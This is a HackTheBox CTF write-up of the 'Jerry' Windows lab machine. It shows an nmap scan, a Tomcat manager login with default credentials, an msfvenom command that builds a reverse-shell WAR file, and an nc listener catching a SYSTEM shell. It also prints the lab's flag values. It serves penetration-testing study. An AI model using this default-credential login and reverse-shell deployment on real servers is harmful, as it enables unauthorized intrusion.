---
title: "HTB - Jerry"
classes: wide
tag:
- "Tomcat default credentials"
- "War deploy exploit"
- "Easy Box"
- "Track/Beginner Track"
header:
  teaser: /assets/images/htb/htb.png
ribbon: lawngreen
description: "Writeup for HTB - Jerry"
categories:
  - HTB
---

The given box ```Jerry``` is a Windows machine 

- [HackTheBox- Jerry](#hackthebox---Jerry)
- [Recon](#recon)
	- [Nmap Scan](#nmap-scan)
- [Enumeration](#enumeration)
	- [Tomcat Site](#tomcat-site)
	- [Finding vulnerability](#Finding-vulnerability)
	- [Default credentials](#Default-credentials)
	- [Deploy war file](#Deploy-war-file)
- [Flags](#flags)


## Recon

### Nmap Scan

`nmap` found only one open port on TCP scan.

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/track_beginnertrack/easy_jerry]
└╼[★]$ cat nmap/initial_scan.nmap
# Nmap 7.92 scan initiated Wed Sep 14 03:09:46 2022 as: nmap -Pn -sC -sV -oN nmap/initial_scan.nmap -v 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.39s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 14 03:10:48 2022 -- 1 IP address (1 host up) scanned in 62.32 seconds
```

## Enumeration

### Tomcat Site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/easy_jerry/assets/images/1.png" >
</center>

### Finding vulnerability

So from the nmap scan got to know `Apache Tomcat/Coyote JSP engine 1.1` is running google for some exploits,

[Reference](https://www.technoscience.site/2022/01/metasploitable-2-exploit-apache.html)

And 2 vulnerabilities found in this service.

### Default credentials

	username - tomcat
	password - s3cret

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/easy_jerry/assets/images/2.png" >
</center>

### Deploy war file 

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/easy_jerry/assets/images/3.png" >
</center>

[Reference to exploit tomcat](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

Used msfvenom to create the war file and deployed in the tomcat server, but running the file `http://10.10.10.95:8080/reshell/` didn't work so used jar extract the `.jsp` file and to run the jsp file `http://10.10.10.95:8080/reshell/cidzsiqqryoneo.jsp` it worked!

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/track_beginnertrack/easy_jerry/war]
└╼[★]$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f war -o reshell.war
```

```shell
┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/track_beginnertrack/easy_jerry/war]
└╼[★]$ jar -ft reshell.war
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
cidzsiqqryoneo.jsp
```

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/easy_jerry/assets/images/4.png" >
</center>

Got the connection successfully!

```shell

┌[us-vip-1]─[10.10.16.2][0xM3M0RY㉿kali]─[~/htb/track_beginnertrack/easy_jerry]
└╼[★]$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.95] 49194
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system
```

## Flags

```shell
type 2*

2 for the price of 1.txt


user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```